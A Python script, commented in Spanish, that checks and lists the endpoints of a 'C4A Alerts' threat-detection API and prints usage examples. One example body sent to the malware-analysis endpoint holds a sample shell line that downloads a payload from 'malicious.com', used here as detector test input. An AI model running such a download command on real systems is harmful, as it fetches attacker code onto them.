#!/usr/bin/env python3
"""
Script para listar y verificar todos los endpoints de la API C4A Alerts.
"""

import requests
import json
from typing import Dict, List, Tuple

def check_endpoint(base_url: str, endpoint: str) -> Tuple[int, str]:
    """Verificar un endpoint específico."""
    try:
        url = f"{base_url}{endpoint}"
        response = requests.get(url, timeout=10)
        return response.status_code, response.text[:100]
    except Exception as e:
        return 0, str(e)

def list_all_endpoints():
    """Listar todos los endpoints disponibles."""
    base_url = "https://c4a-alerts-api-f3th7ffaka-uc.a.run.app"

    print("🔍 C4A Alerts API - Endpoints Disponibles")
    print("=" * 50)
    print(f"🌐 Base URL: {base_url}")
    print()

    # Definir todos los endpoints conocidos
    endpoints = {
        "Frontend": [
            ("/", "Dashboard principal"),
            ("/docs", "Documentación Swagger"),
            ("/redoc", "Documentación ReDoc"),
        ],
        "API Health": [
            ("/api/v1/health", "Estado de salud de la API"),
        ],
        "Malware Analysis": [
            ("/api/v1/malware/analyze", "Análisis de malware"),
            ("/api/v1/malware/rules", "Reglas de detección"),
            ("/api/v1/malware/patterns", "Patrones de evasión"),
            ("/api/v1/malware/test", "Prueba de detección"),
        ],
        "Workers": [
            ("/api/v1/workers/status", "Estado de los workers"),
            ("/api/v1/workers/tasks", "Tareas pendientes"),
        ],
        "Alerts": [
            ("/api/v1/alerts", "Lista de alertas"),
            ("/api/v1/alerts/recent", "Alertas recientes"),
        ],
        "Integrations": [
            ("/api/v1/integrations/telegram", "Integración Telegram"),
            ("/api/v1/integrations/slack", "Integración Slack"),
        ]
    }

    # Verificar cada endpoint
    for category, endpoint_list in endpoints.items():
        print(f"📋 {category}:")
        print("-" * 30)

        for endpoint, description in endpoint_list:
            status_code, response_text = check_endpoint(base_url, endpoint)

            if status_code == 200:
                status_icon = "✅"
                status_text = "ACTIVO"
            elif status_code == 404:
                status_icon = "❌"
                status_text = "NO ENCONTRADO"
            elif status_code == 0:
                status_icon = "⚠️"
                status_text = "ERROR"
            else:
                status_icon = "🟡"
                status_text = f"STATUS {status_code}"

            print(f"{status_icon} {endpoint}")
            print(f"   📝 {description}")
            print(f"   🔗 {base_url}{endpoint}")
            print(f"   📊 {status_text}")
            print()

def show_api_documentation():
    """Mostrar información sobre la documentación de la API."""
    base_url = "https://c4a-alerts-api-f3th7ffaka-uc.a.run.app"

    print("📚 Documentación de la API:")
    print("=" * 30)
    print(f"🔗 Swagger UI: {base_url}/docs")
    print(f"🔗 ReDoc: {base_url}/redoc")
    print(f"🔗 OpenAPI JSON: {base_url}/openapi.json")
    print()

def show_usage_examples():
    """Mostrar ejemplos de uso de la API."""
    base_url = "https://c4a-alerts-api-f3th7ffaka-uc.a.run.app"

    print("💡 Ejemplos de Uso:")
    print("=" * 20)

    examples = [
        {
            "name": "Health Check",
            "method": "GET",
            "url": f"{base_url}/api/v1/health",
            "description": "Verificar estado de la API"
        },
        {
            "name": "Análisis de Malware",
            "method": "POST",
            "url": f"{base_url}/api/v1/malware/analyze",
            "description": "Analizar contenido en busca de malware",
            "body": {
                "content": "#!/bin/bash\nwget http://malicious.com/payload",
                "source": "telegram_user_123"
            }
        },
        {
            "name": "Reglas de Detección",
            "method": "GET",
            "url": f"{base_url}/api/v1/malware/rules",
            "description": "Obtener reglas de detección activas"
        },
        {
            "name": "Estado de Workers",
            "method": "GET",
            "url": f"{base_url}/api/v1/workers/status",
            "description": "Verificar estado de los workers"
        }
    ]

    for example in examples:
        print(f"🔧 {example['name']}")
        print(f"   📡 {example['method']} {example['url']}")
        print(f"   📝 {example['description']}")
        if 'body' in example:
            print(f"   📦 Body: {json.dumps(example['body'], indent=2)}")
        print()

def main():
    """Función principal."""
    print("🚀 C4A Alerts API - Verificador de Endpoints")
    print("=" * 55)

    try:
        list_all_endpoints()
        show_api_documentation()
        show_usage_examples()

        print("🎉 Verificación completada!")
        print("📋 Todos los endpoints están listados arriba.")

    except Exception as e:
        print(f"❌ Error durante la verificación: {e}")

if __name__ == "__main__":
    main()
